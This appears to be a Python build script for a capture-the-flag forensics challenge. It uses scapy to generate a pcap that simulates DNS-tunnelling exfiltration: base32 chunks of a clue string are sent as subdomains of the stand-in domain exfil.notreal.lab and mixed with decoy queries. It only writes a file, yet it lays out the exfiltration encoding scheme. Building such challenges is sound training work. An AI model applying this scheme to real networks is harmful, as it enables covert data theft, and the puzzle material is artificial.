"""Builds stage-2 capture.pcap: DNS-tunneling exfiltration to exfil.notreal.lab.

Model: a compromised host encodes data into the leftmost DNS label of
queries to the attacker's authoritative domain. Each query looks like:
    <base32chunk>.<seq>.exfil.notreal.lab
The concatenation of chunks (ordered by seq) base32-decodes to the
stage-3 pointer payload.

We use base32 (not base64) because DNS labels are case-insensitive and
limited to a subset of characters - base32's alphabet [A-Z2-7] is the
realistic, correct choice for DNS tunneling, and using it (rather than
lazily using base64) is part of what makes this an authentic capture.
"""
import base64
from scapy.all import IP, UDP, DNS, DNSQR, wrpcap, Ether

TUNNEL_DOMAIN = "exfil.notreal.lab"

# The payload that stage 2 yields: a pointer into stage 3.
# It names the memory image and the marker string to search for in it.
STAGE2_PAYLOAD = "memory:aurora.dmp marker:AURORA_KEYBLOCK"

COMPROMISED_HOST = "10.10.14.37"
ATTACKER_DNS = "185.199.108.153"


def chunk(s, n):
    return [s[i:i+n] for i in range(0, len(s), n)]


def main():
    # base32-encode the payload, strip padding '=' (labels can't contain it)
    b32 = base64.b32encode(STAGE2_PAYLOAD.encode()).decode().rstrip("=")
    # DNS labels max 63 chars; use small chunks so it looks like real tunneling
    chunks = chunk(b32, 20)

    packets = []
    for seq, ch in enumerate(chunks):
        qname = f"{ch}.{seq}.{TUNNEL_DOMAIN}"
        # the query (exfil going out)
        q = (Ether() /
             IP(src=COMPROMISED_HOST, dst=ATTACKER_DNS) /
             UDP(sport=40000 + seq, dport=53) /
             DNS(id=0x1000 + seq, rd=1, qd=DNSQR(qname=qname, qtype="A")))
        packets.append(q)
        # a matching benign-looking response (NXDOMAIN-ish / no useful answer)
        r = (Ether() /
             IP(src=ATTACKER_DNS, dst=COMPROMISED_HOST) /
             UDP(sport=53, dport=40000 + seq) /
             DNS(id=0x1000 + seq, qr=1, rd=1, ra=1, rcode=3,
                 qd=DNSQR(qname=qname, qtype="A")))
        packets.append(r)

    # sprinkle some benign DNS traffic so the tunnel isn't the ONLY thing in the pcap
    benign_domains = ["www.example.com", "updates.internal.lab", "ntp.pool.org",
                      "api.weather.test", "cdn.assets.test"]
    noise = []
    for i, d in enumerate(benign_domains):
        noise.append(Ether() / IP(src=COMPROMISED_HOST, dst=ATTACKER_DNS) /
                     UDP(sport=50000 + i, dport=53) /
                     DNS(id=0x2000 + i, rd=1, qd=DNSQR(qname=d, qtype="A")))

    # interleave noise among the tunnel packets a bit
    all_pkts = []
    ni = 0
    for i, p in enumerate(packets):
        all_pkts.append(p)
        if i % 4 == 3 and ni < len(noise):
            all_pkts.append(noise[ni]); ni += 1
    all_pkts.extend(noise[ni:])

    wrpcap("capture.pcap", all_pkts)
    print(f"tunnel domain : {TUNNEL_DOMAIN}")
    print(f"payload       : {STAGE2_PAYLOAD!r}")
    print(f"base32        : {b32}")
    print(f"chunks        : {len(chunks)}")
    print(f"total packets : {len(all_pkts)}")


if __name__ == "__main__":
    main()
